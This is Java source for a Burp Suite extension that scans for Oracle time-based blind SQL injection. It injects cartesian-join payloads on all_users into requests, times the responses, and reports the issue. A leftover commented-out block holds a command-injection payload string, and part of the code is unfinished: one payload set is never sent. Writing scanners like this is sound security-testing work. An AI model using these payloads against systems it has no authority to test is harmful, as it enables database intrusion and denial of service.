package burp;

import burp.about;

import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.TextArea;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import java.net.URL;
import java.util.concurrent.TimeUnit;
import javax.swing.*;

public class BurpExtender implements IBurpExtender, ITab, IScannerCheck {

    Boolean isDebugging = false;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private PrintWriter mStdOut;
    private PrintWriter mStdErr;

    // GUI
    private JTabbedPane topTabs;

    //
    // implement IBurpExtender
    //
    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;

        this.helpers = callbacks.getHelpers();

        this.mStdOut = new PrintWriter(callbacks.getStdout(), true);
        this.mStdErr = new PrintWriter(callbacks.getStderr(), true);

        callbacks.setExtensionName("Oracle Time Based SQL Injection Scanner");

        // register ourselves as a custom scanner check
        callbacks.registerScannerCheck(this);

        // GUI
        /**
         * SwingUtilities.invokeLater(new Runnable() {
         *
         * @Override public void run() { topTabs = new JTabbedPane(); JPanel
         * parametersPanel = new JPanel(); JPanel payloadsPanel = new JPanel();
         * JPanel aboutPanel = new JPanel();
         * parametersTextArea.setText("callback\njsonpcallback\njsonp\ncb\njcb");
         * payloadsTextArea.setText("\"||calc||"); topTabs.addTab("RFD
         * Parameters", parametersPanel); topTabs.addTab("RFD Payloads",
         * payloadsPanel); burp.about.initializeFunction(topTabs);
         * parametersPanel.add(new JLabel("Parameters:"));
         * parametersPanel.add(parametersTextArea); JButton
         * clearButtonForParameters = new JButton("Clear");
         * parametersPanel.add(clearButtonForParameters);
         * clearButtonForParameters.addActionListener(new ActionListener() {
         * @Override public void actionPerformed(ActionEvent ae) {
         * parametersTextArea.setText(""); } }); payloadsPanel.add(new
         * JLabel("Payloads:")); payloadsPanel.add(payloadsTextArea); JButton
         * clearButtonForPayloads = new JButton("Clear");
         * payloadsPanel.add(clearButtonForPayloads);
         * clearButtonForPayloads.addActionListener(new ActionListener() {
         * @Override public void actionPerformed(ActionEvent ae) {
         * payloadsTextArea.setText(""); } }); // customize our UI components
         * //callbacks.customizeUiComponent(topTabs); // disabled to be able to
         * drag and drop columns // add the custom tab to Burp's UI
         * callbacks.addSuiteTab(BurpExtender.this); } });*
         */
    }

    @Override
    public String getTabCaption() {
        return "Oracle Time Based SQL Injection Scanner";
    }

    @Override
    public Component getUiComponent() {
        return topTabs;
    }

    // helper method to search a response for occurrences of a literal match string
    // and return a list of start/end offsets
    private List<int[]> getMatches(byte[] response, byte[] match) {
        List<int[]> matches = new ArrayList<int[]>();

        int start = 0;
        while (start < response.length) {
            start = helpers.indexOf(response, match, true, start, response.length);
            if (start == -1) {
                break;
            }
            matches.add(new int[]{start, start + match.length});
            start += match.length;
        }

        return matches;
    }

    //
    // implement IScannerCheck
    //
    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
            IScannerInsertionPoint insertionPoint) {

        String[] payloads = new String[3];
        String[] payloads2 = new String[3];
        String[] payloads3 = new String[3];

        payloads[0] = "1 and 1=(SELECT count(*) FROM all_users A,all_users B,all_users C)--";
        payloads[1] = "1 and 1=(SELECT count(*) FROM all_users A,all_users B,all_users C,all_users D)--";
        payloads[2] = "1 and 1=(SELECT count(*) FROM all_users A,all_users B,all_users C,all_users D,all_users E)--";

        payloads2[0] = "'||(SELECT count(*) FROM all_users A,all_users B,all_users C)||'";
        payloads2[1] = "'||(SELECT count(*) FROM all_users A,all_users B,all_users C,all_users D)||'";
        payloads2[2] = "'||(SELECT count(*) FROM all_users A,all_users B,all_users C,all_users D,all_users E)||'";

        payloads3[0] = "(SELECT count(*) FROM all_users A,all_users B,all_users C)";
        payloads3[1] = "(SELECT count(*) FROM all_users A,all_users B,all_users C,all_users D)";
        payloads3[2] = "(SELECT count(*) FROM all_users A,all_users B,all_users C,all_users D,all_users E)";

        long[] totalTimes = new long[3];
        long[] totalTimes2 = new long[3];
        long[] totalTimes3 = new long[3];

        IHttpRequestResponse checkRequestResponse = null;
        IHttpRequestResponse checkRequestResponse2 = null;
        IHttpRequestResponse checkRequestResponse3 = null;
        
        byte[] checkRequest = null;
        byte[] checkRequest2 = null;
        byte[] checkRequest3 = null;
        
        for (int i = 0; i < payloads.length; i++) {

            checkRequest = insertionPoint.buildRequest(helpers.stringToBytes(payloads[i]));
            long startTime = System.nanoTime();
            checkRequestResponse = this.callbacks.makeHttpRequest(baseRequestResponse
                    .getHttpService(), checkRequest);

            totalTimes[i] = System.nanoTime() - startTime;
            mStdOut.println("Total time in milliseconds: " + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes[i])));
        }

        for (int i = 0; i < payloads2.length; i++) {

            checkRequest2 = insertionPoint.buildRequest(helpers.stringToBytes(payloads2[i]));
            long startTime2 = System.nanoTime();
            checkRequestResponse2 = this.callbacks.makeHttpRequest(baseRequestResponse
                    .getHttpService(), checkRequest2);

            totalTimes2[i] = System.nanoTime() - startTime2;
            mStdOut.println("Total time in milliseconds: " + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes2[i])));
        }

        
        
        if (totalTimes[2] > (totalTimes[1] * 2)
                & totalTimes[1] > (totalTimes[0] * 2)
                & totalTimes[2] > (totalTimes[0] * 4)) {

            List<IScanIssue> issues = new ArrayList<>();
            issues.add(new burp.CustomIssue(
                    checkRequestResponse.getHttpService(),
                    this.callbacks.getHelpers().analyzeRequest(checkRequestResponse).getUrl(),
                    checkRequestResponse,
                    "Oracle Time Based Blind SQL Injection",
                    "By using following payloads<br><br>"
                    + payloads[0] + "<br>"
                    + payloads[1] + "<br>"
                    + payloads[2] + "<br><br>"
                    + "time based Oracle SQL injection is triggered.<br><br>"
                    + "Requests are completed within following milliseconds<br><br>"
                    + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes[0])) + "<br>"
                    + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes[1])) + "<br>"
                    + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes[2])) + "<br>"
                    + "<br>",
                    "High",
                    "Certain")
            );
            return issues;
        }

        if (totalTimes2[2] > (totalTimes2[1] * 2)
                & totalTimes2[1] > (totalTimes2[0] * 2)
                & totalTimes2[2] > (totalTimes2[0] * 4)) {

            List<IScanIssue> issues2 = new ArrayList<>();
            issues2.add(new burp.CustomIssue(
                    checkRequestResponse2.getHttpService(),
                    this.callbacks.getHelpers().analyzeRequest(checkRequestResponse2).getUrl(),
                    checkRequestResponse2,
                    "Oracle Time Based Blind SQL Injection",
                    "By using following payloads<br><br>"
                    + payloads2[0] + "<br>"
                    + payloads2[1] + "<br>"
                    + payloads2[2] + "<br><br>"
                    + "time based Oracle SQL injection is triggered.<br><br>"
                    + "Requests are completed within following milliseconds<br><br>"
                    + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes2[0])) + "<br>"
                    + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes2[1])) + "<br>"
                    + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes2[2])) + "<br>"
                    + "<br>",
                    "High",
                    "Certain")
            );
            return issues2;
        }
        if (totalTimes3[2] > (totalTimes3[1] * 2)
                & totalTimes3[1] > (totalTimes3[0] * 2)
                & totalTimes3[2] > (totalTimes3[0] * 4)) {

            List<IScanIssue> issues3 = new ArrayList<>();
            issues3.add(new burp.CustomIssue(
                    checkRequestResponse3.getHttpService(),
                    this.callbacks.getHelpers().analyzeRequest(checkRequestResponse3).getUrl(),
                    checkRequestResponse3,
                    "Oracle Time Based Blind SQL Injection",
                    "By using following payloads<br><br>"
                    + payloads3[0] + "<br>"
                    + payloads3[1] + "<br>"
                    + payloads3[2] + "<br><br>"
                    + "time based Oracle SQL injection is triggered.<br><br>"
                    + "Requests are completed within following milliseconds<br><br>"
                    + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes3[0])) + "<br>"
                    + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes3[1])) + "<br>"
                    + String.valueOf(TimeUnit.NANOSECONDS.toMillis(totalTimes3[2])) + "<br>"
                    + "<br>",
                    "High",
                    "Certain")
            );
            return issues3;
        }
        return null;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {

        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        // This method is called when multiple issues are reported for the same URL 
        // path by the same extension-provided check. The value we return from this 
        // method determines how/whether Burp consolidates the multiple issues
        // to prevent duplication
        //
        // Since the issue name is sufficient to identify our issues as different,
        // if both issues have the same name, only report the existing issue
        // otherwise report both issues
        if (existingIssue.getIssueName().equals(newIssue.getIssueName())) {
            return -1;
        } else {
            return 0;
        }
    }
}
